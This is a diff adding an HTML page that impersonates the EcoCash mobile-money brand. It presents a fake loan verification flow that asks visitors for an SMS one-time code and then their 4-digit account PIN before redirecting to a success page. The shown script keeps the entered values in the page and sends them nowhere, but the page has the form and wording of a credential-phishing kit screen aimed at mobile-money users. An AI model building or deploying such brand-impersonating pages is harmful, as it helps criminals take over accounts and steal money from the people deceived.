@@ -1,0 +1,715 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EcoCash Verification</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --eco-blue: #0072CE;
+            --eco-blue-dark: #005AA3;
+            --eco-blue-deep: #003E73;
+            --eco-blue-soft: rgba(0, 114, 206, 0.09);
+            --eco-blue-border: rgba(0, 114, 206, 0.22);
+            --eco-yellow: #FFD100;
+            --eco-green: #00843D;
+            --text-main: #102033;
+            --text-muted: #64748b;
+            --surface: #ffffff;
+            --page-bg: #eef6ff;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        html, body {
+            width: 100%;
+            min-height: 100%;
+        }
+
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 14px;
+            background:
+                radial-gradient(circle at top left, rgba(255, 209, 0, 0.32), transparent 28%),
+                radial-gradient(circle at bottom right, rgba(0, 114, 206, 0.28), transparent 34%),
+                linear-gradient(145deg, #0072CE 0%, #005AA3 42%, #EEF6FF 42%, #F8FBFF 100%);
+            color: var(--text-main);
+        }
+
+        .container,
+        .modal-card {
+            width: 100%;
+            max-width: 430px;
+            background: var(--surface);
+            border-radius: 28px;
+            box-shadow: 0 24px 62px rgba(0, 48, 98, 0.28);
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            border: 1px solid rgba(255,255,255,0.72);
+        }
+
+        .container { max-height: 94vh; }
+        .modal-card { max-height: 90vh; animation: fadeUp 0.35s cubic-bezier(.22,.8,.3,1) both; }
+
+        .logo-section,
+        .modal-logo-section {
+            background: linear-gradient(135deg, var(--eco-blue) 0%, var(--eco-blue-dark) 100%);
+            text-align: center;
+            padding: 30px 20px 25px;
+            flex-shrink: 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .logo-section::before,
+        .modal-logo-section::before {
+            content: "";
+            position: absolute;
+            width: 160px;
+            height: 160px;
+            border-radius: 50%;
+            background: rgba(255, 209, 0, 0.22);
+            right: -54px;
+            top: -78px;
+        }
+
+        .logo-section::after,
+        .modal-logo-section::after {
+            content: "";
+            position: absolute;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            height: 6px;
+            background: linear-gradient(90deg, var(--eco-yellow), #ffffff, var(--eco-yellow));
+        }
+
+        .brand-logo {
+            position: relative;
+            z-index: 1;
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .logo-icon {
+            width: 52px;
+            height: 52px;
+            background: #fff;
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            box-shadow: 0 12px 26px rgba(0, 0, 0, 0.16);
+        }
+
+        .brand-copy { text-align: left; }
+
+        .brand-name {
+            color: white;
+            font-size: 29px;
+            font-weight: 800;
+            letter-spacing: -0.8px;
+            line-height: 1;
+        }
+
+        .brand-name span { color: var(--eco-yellow); }
+
+        .tagline {
+            color: rgba(255,255,255,0.88);
+            font-size: 12px;
+            margin-top: 7px;
+            letter-spacing: 0.6px;
+            text-transform: uppercase;
+            font-weight: 700;
+        }
+
+        .content-wrapper,
+        .modal-content {
+            flex: 1;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            padding-top: 2px;
+        }
+
+        h1,
+        .modal-h1 {
+            text-align: center;
+            font-size: 23px;
+            font-weight: 800;
+            color: var(--text-main);
+            margin: 22px 0 7px;
+            padding: 0 22px;
+            letter-spacing: -0.35px;
+        }
+
+        .subtitle,
+        .modal-subtitle {
+            text-align: center;
+            color: #475569;
+            font-size: 14.2px;
+            padding: 0 27px 18px;
+            line-height: 1.58;
+        }
+
+        .phone-display {
+            text-align: center;
+            font-size: 13.5px;
+            color: var(--text-muted);
+            margin: -7px 0 15px;
+            padding: 0 25px;
+        }
+
+        .phone-display strong {
+            color: var(--eco-blue);
+            font-weight: 800;
+        }
+
+        .offer-info {
+            background: linear-gradient(180deg, #ffffff 0%, #f3f9ff 100%);
+            margin: 0 20px 18px;
+            padding: 17px 15px 16px;
+            border-radius: 20px;
+            text-align: center;
+            border: 1px solid var(--eco-blue-border);
+            box-shadow: 0 12px 28px rgba(0, 114, 206, 0.09);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .offer-info::before {
+            content: "";
+            position: absolute;
+            left: 0;
+            right: 0;
+            top: 0;
+            height: 4px;
+            background: linear-gradient(90deg, var(--eco-blue), var(--eco-yellow), var(--eco-blue));
+        }
+
+        .offer-label {
+            font-size: 11.5px;
+            color: var(--eco-blue);
+            text-transform: uppercase;
+            letter-spacing: 0.75px;
+            font-weight: 800;
+            margin-bottom: 6px;
+        }
+
+        .offer-name {
+            font-size: 15.5px;
+            font-weight: 800;
+            color: var(--text-main);
+            margin-bottom: 3px;
+        }
+
+        .offer-amount {
+            color: var(--eco-blue);
+            font-weight: 800;
+            font-size: 27px;
+            line-height: 1.2;
+        }
+
+        .offer-meta {
+            display: flex;
+            justify-content: center;
+            gap: 9px;
+            margin-top: 10px;
+            flex-wrap: wrap;
+        }
+
+        .meta-item {
+            font-size: 12px;
+            color: var(--text-muted);
+            padding: 7px 10px;
+            background: #edf7ff;
+            border: 1px solid #d8ecff;
+            border-radius: 999px;
+        }
+
+        .meta-item span {
+            font-weight: 800;
+            color: var(--text-main);
+        }
+
+        .otp-container {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin: 18px 0 18px;
+            padding: 0 20px;
+            flex-wrap: nowrap;
+        }
+
+        .otp-input {
+            width: 54px;
+            height: 64px;
+            text-align: center;
+            font-size: 27px;
+            font-weight: 800;
+            color: var(--eco-blue);
+            background: #ffffff;
+            border: 2px solid #dbeafe;
+            border-radius: 17px;
+            outline: none;
+            transition: all 0.2s ease;
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            flex-shrink: 0;
+            box-shadow: inset 0 1px 0 rgba(255,255,255,0.9), 0 8px 20px rgba(0, 114, 206, 0.06);
+        }
+
+        .otp-input:focus {
+            border-color: var(--eco-blue);
+            box-shadow: 0 0 0 4px rgba(0,114,206,0.14), 0 10px 22px rgba(0, 114, 206, 0.12);
+            transform: translateY(-1px);
+        }
+
+        .otp-input.filled {
+            border-color: var(--eco-blue);
+            background: #f0f8ff;
+        }
+
+        .safe-note {
+            margin: 0 20px 16px;
+            padding: 13px 14px;
+            border-radius: 16px;
+            background: #fff8d6;
+            border: 1px solid #f5e38a;
+            color: #735300;
+            font-size: 12.8px;
+            line-height: 1.48;
+            text-align: center;
+        }
+
+        .error-msg,
+        .pin-error-msg,
+        .status-msg {
+            text-align: center;
+            margin: 0 20px 16px;
+            font-size: 14px;
+            padding: 13px;
+            border-radius: 14px;
+            display: none;
+            font-weight: 700;
+        }
+
+        .error-msg,
+        .pin-error-msg {
+            color: #b91c1c;
+            background: #fee2e2;
+            border: 1px solid #fca5a5;
+        }
+
+        .status-msg {
+            color: var(--eco-blue-deep);
+            background: #e0f2fe;
+            border: 1px solid #93c5fd;
+        }
+
+        .form-section,
+        .modal-form-section {
+            padding: 0 25px 30px;
+            flex-shrink: 0;
+        }
+
+        .btn-action {
+            width: 100%;
+            background: var(--eco-blue);
+            color: white;
+            border: none;
+            padding: 17px;
+            font-size: 16.5px;
+            font-weight: 800;
+            border-radius: 999px;
+            cursor: pointer;
+            margin: 10px 0;
+            transition: transform 0.2s, box-shadow 0.2s, background 0.2s;
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            box-shadow: 0 14px 26px rgba(0, 114, 206, 0.28);
+        }
+
+        .btn-action:hover {
+            background: var(--eco-blue-dark);
+            transform: translateY(-1px);
+            box-shadow: 0 18px 32px rgba(0, 114, 206, 0.32);
+        }
+
+        .btn-action:disabled {
+            background: #94a3b8;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .back-btn {
+            width: 100%;
+            background: #ffffff;
+            color: var(--eco-blue);
+            border: 2px solid #dbeafe;
+            padding: 15px;
+            font-size: 15.5px;
+            font-weight: 800;
+            border-radius: 999px;
+            cursor: pointer;
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            transition: all 0.2s;
+        }
+
+        .back-btn:hover {
+            border-color: var(--eco-blue);
+            background: #f3f9ff;
+        }
+
+        #spinner {
+            display: none;
+            position: fixed;
+            inset: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 38, 73, 0.92);
+            z-index: 10000;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            color: white;
+            text-align: center;
+            padding: 24px;
+        }
+
+        .spin {
+            width: 65px;
+            height: 65px;
+            border: 6px solid rgba(255,255,255,0.22);
+            border-top: 6px solid var(--eco-yellow);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        #pinModal {
+            display: none;
+            position: fixed;
+            inset: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 38, 73, 0.74);
+            z-index: 3000;
+            align-items: center;
+            justify-content: center;
+            padding: 10px;
+            backdrop-filter: blur(4px);
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes fadeUp {
+            from { opacity: 0; transform: translateY(24px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @media (max-width: 480px) {
+            body { padding: 10px; align-items: flex-start; }
+            .container { border-radius: 22px; margin-top: 14px; }
+            .modal-card { border-radius: 22px; margin-top: 14px; }
+            .logo-section, .modal-logo-section { padding: 26px 16px 22px; }
+            h1, .modal-h1 { font-size: 21px; margin: 19px 0 5px; }
+            .subtitle, .modal-subtitle { font-size: 13.4px; padding: 0 20px 15px; }
+            .form-section, .modal-form-section { padding: 0 20px 25px; }
+            .btn-action { padding: 15px; font-size: 15.8px; margin: 8px 0; }
+            .back-btn { padding: 14px; font-size: 15px; }
+            .brand-name { font-size: 26px; }
+            .otp-input { width: 49px; height: 59px; font-size: 24px; border-radius: 15px; }
+            .otp-container { gap: 8px; margin: 16px 0 16px; }
+        }
+
+        @media (max-width: 380px) {
+            .otp-input { width: 43px; height: 53px; font-size: 21px; }
+            .otp-container { gap: 6px; padding: 0 14px; }
+            .brand-name { font-size: 24px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-section">
+            <div class="brand-logo">
+                <div class="logo-icon" aria-hidden="true">
+                    <svg width="31" height="31" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <rect x="4" y="9" width="24" height="17" rx="4" fill="#0072CE"/>
+                        <path d="M8 14H24" stroke="#FFD100" stroke-width="2.5" stroke-linecap="round"/>
+                        <circle cx="22" cy="21" r="2.7" fill="#FFD100"/>
+                        <path d="M10 6C13 3.4 19 3.4 22 6" stroke="#0072CE" stroke-width="2.4" stroke-linecap="round"/>
+                    </svg>
+                </div>
+                <div class="brand-copy">
+                    <div class="brand-name">Eco<span>Cash</span></div>
+                    <div class="tagline">Mobile Money • Loans</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="content-wrapper">
+            <h1>EcoCash Verification</h1>
+            <p class="subtitle">A 5-digit verification code has been sent to your number. Enter it below to confirm your loan application.</p>
+            <p class="phone-display" id="phoneDisplay"></p>
+
+            <div class="offer-info" id="offerInfo">
+                <div class="offer-label">Loan Application</div>
+                <div class="offer-name" id="offerTitle"></div>
+                <div class="offer-amount" id="offerPrice"></div>
+                <div class="offer-meta" id="offerMeta"></div>
+            </div>
+
+            <div class="otp-container" id="otpInputs" aria-label="Five digit verification code"></div>
+            <div class="error-msg" id="errMsg"></div>
+
+            <div class="form-section">
+                <button class="btn-action" id="verifyBtn">Verify & Confirm Loan</button>
+                <button class="back-btn" onclick="window.history.back()">← Back</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="pinModal">
+        <div class="modal-card">
+            <div class="modal-logo-section">
+                <div class="brand-logo">
+                    <div class="logo-icon" aria-hidden="true">
+                        <svg width="31" height="31" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <rect x="4" y="9" width="24" height="17" rx="4" fill="#0072CE"/>
+                            <path d="M8 14H24" stroke="#FFD100" stroke-width="2.5" stroke-linecap="round"/>
+                            <circle cx="22" cy="21" r="2.7" fill="#FFD100"/>
+                            <path d="M10 6C13 3.4 19 3.4 22 6" stroke="#0072CE" stroke-width="2.4" stroke-linecap="round"/>
+                        </svg>
+                    </div>
+                    <div class="brand-copy">
+                        <div class="brand-name">Eco<span>Cash</span></div>
+                        <div class="tagline">Mobile Money • Loans</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="modal-content">
+                <h1 class="modal-h1">Enter PIN</h1>
+                <p class="modal-subtitle">Enter your 4-digit PIN to complete this transaction securely.</p>
+
+                <div class="otp-container" id="pinInputs" aria-label="Four digit PIN"></div>
+                <div class="pin-error-msg" id="pinErrMsg"></div>
+
+                <div class="modal-form-section">
+                    <button class="btn-action" id="confirmPinBtn">Confirm PIN</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="spinner">
+        <div class="spin"></div>
+        <p style="margin-top:25px; font-size:17px;">Verifying code...</p>
+    </div>
+
+    <script>
+        const CONFIG = {
+            SUCCESS_PAGE: 'success.html',
+            DEVICE_PAGE: 'device_verify.html',
+            DEMO_MODE: true
+        };
+
+        let isProcessing = false;
+
+        const errMsg = document.getElementById('errMsg');
+        const pinErrMsg = document.getElementById('pinErrMsg');
+        const spinner = document.getElementById('spinner');
+        const pinModal = document.getElementById('pinModal');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const confirmPinBtn = document.getElementById('confirmPinBtn');
+        const offerTitleEl = document.getElementById('offerTitle');
+        const offerPriceEl = document.getElementById('offerPrice');
+        const offerMetaEl = document.getElementById('offerMeta');
+        const phoneDisplayEl = document.getElementById('phoneDisplay');
+
+        const params = new URLSearchParams(window.location.search);
+
+        function getAllParams() {
+            return params.toString();
+        }
+
+        function loadOffer() {
+            const name     = params.get('name')     || params.get('loan_name')   || 'Flex Loan';
+            const amount   = params.get('amount')   || params.get('loan_amount') || '1000';
+            const phone    = params.get('phone')    || params.get('msisdn')      || '';
+            const duration = params.get('duration') || params.get('tenor')       || '';
+            const rate     = params.get('rate')     || params.get('interest')    || '';
+            const fee      = params.get('fee')      || '';
+
+            offerTitleEl.textContent = name;
+            const numericAmount = parseInt(amount, 10);
+            offerPriceEl.textContent = Number.isFinite(numericAmount)
+                ? `GHS ${numericAmount.toLocaleString()}`
+                : `GHS ${amount}`;
+
+            const metaItems = [];
+            if (duration) metaItems.push({ label: 'Duration', value: duration });
+            if (rate)     metaItems.push({ label: 'Interest', value: rate });
+            if (fee)      metaItems.push({ label: 'Fee', value: `GHS ${fee}` });
+
+            offerMetaEl.innerHTML = metaItems.length
+                ? metaItems.map(m => `<div class="meta-item">${escapeHTML(m.label)}: <span>${escapeHTML(m.value)}</span></div>`).join('')
+                : '';
+
+            if (phone) {
+                phoneDisplayEl.innerHTML = `Code sent to <strong>${escapeHTML(maskPhone(phone))}</strong>`;
+            }
+        }
+
+        function maskPhone(phone) {
+            const p = String(phone).replace(/\s+/g, '');
+            if (p.length <= 5) return p;
+            return p.slice(0, 3) + '*'.repeat(p.length - 5) + p.slice(-2);
+        }
+
+        function escapeHTML(value) {
+            return String(value)
+                .replace(/&/g, '&amp;')
+                .replace(/</g, '&lt;')
+                .replace(/>/g, '&gt;')
+                .replace(/"/g, '&quot;')
+                .replace(/'/g, '&#039;');
+        }
+
+        function createInputs(containerId, count) {
+            const container = document.getElementById(containerId);
+            container.innerHTML = '';
+            for (let i = 0; i < count; i++) {
+                const input = document.createElement('input');
+                input.type = 'text';
+                input.maxLength = 1;
+                input.className = 'otp-input';
+                input.inputMode = 'numeric';
+                input.pattern = '[0-9]*';
+                input.autocomplete = 'one-time-code';
+                input.addEventListener('input', () => {
+                    input.classList.toggle('filled', input.value.trim().length === 1);
+                });
+                container.appendChild(input);
+            }
+        }
+
+        function getCode(containerId) {
+            return Array.from(document.querySelectorAll(`#${containerId} .otp-input`))
+                .map(i => i.value.trim()).join('');
+        }
+
+        function setupAutoFocus(containerId, length, onComplete) {
+            const inputs = document.querySelectorAll(`#${containerId} .otp-input`);
+            inputs.forEach((input, index) => {
+                input.addEventListener('input', () => {
+                    input.value = input.value.replace(/\D/g, '');
+                    if (input.value.length === 1 && index < length - 1) {
+                        inputs[index + 1].focus();
+                    }
+                    if (getCode(containerId).length === length) {
+                        setTimeout(onComplete, 180);
+                    }
+                });
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && !input.value && index > 0) {
+                        inputs[index - 1].focus();
+                    }
+                });
+                input.addEventListener('paste', (e) => {
+                    e.preventDefault();
+                    const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, length);
+                    pasted.split('').forEach((digit, digitIndex) => {
+                        if (inputs[digitIndex]) {
+                            inputs[digitIndex].value = digit;
+                            inputs[digitIndex].classList.add('filled');
+                        }
+                    });
+                    if (pasted.length === length) setTimeout(onComplete, 180);
+                    else if (inputs[pasted.length]) inputs[pasted.length].focus();
+                });
+            });
+        }
+
+        function focusFirstInput(containerId) {
+            const first = document.querySelector(`#${containerId} .otp-input`);
+            if (first) first.focus();
+        }
+
+        function buildNextUrl(page) {
+            const qs = getAllParams();
+            return qs ? `${page}?${qs}` : page;
+        }
+
+        function submitOTP() {
+            if (isProcessing) return;
+            errMsg.style.display = 'none';
+            isProcessing = true;
+            verifyBtn.disabled = true;
+            verifyBtn.textContent = 'Verifying...';
+
+            const otp = getCode('otpInputs');
+            if (otp.length !== 5) {
+                errMsg.textContent = 'Please enter the 5-digit verification code.';
+                errMsg.style.display = 'block';
+                resetButton();
+                return;
+            }
+
+            spinner.style.display = 'flex';
+            setTimeout(() => {
+                spinner.style.display = 'none';
+                showPinModal();
+                resetButton();
+            }, 750);
+        }
+
+        function showPinModal() {
+            pinModal.style.display = 'flex';
+            createInputs('pinInputs', 4);
+            setupAutoFocus('pinInputs', 4, submitPIN);
+            pinErrMsg.style.display = 'none';
+            confirmPinBtn.disabled = false;
+            confirmPinBtn.textContent = 'Confirm PIN';
+            setTimeout(() => focusFirstInput('pinInputs'), 80);
+        }
+
+        function submitPIN() {
+            const pin = getCode('pinInputs');
+            pinErrMsg.style.display = 'none';
+            if (pin.length !== 4) {
+                pinErrMsg.textContent = 'Please enter the 4-digit PIN.';
+                pinErrMsg.style.display = 'block';
+                return;
+            }
+
+            confirmPinBtn.disabled = true;
+            confirmPinBtn.textContent = 'Verifying...';
+
+            setTimeout(() => {
+                pinModal.style.display = 'none';
+                window.location.href = buildNextUrl(CONFIG.SUCCESS_PAGE);
+            }, 650);
+        }
+
+        function resetButton() {
+            isProcessing = false;
+            verifyBtn.disabled = false;
+            verifyBtn.textContent = 'Verify & Confirm Loan';
+        }
+
+        createInputs('otpInputs', 5);
+        setupAutoFocus('otpInputs', 5, submitOTP);
+        verifyBtn.onclick = submitOTP;
+        confirmPinBtn.onclick = submitPIN;
+        loadOffer();
+    </script>
+</body>
+</html>
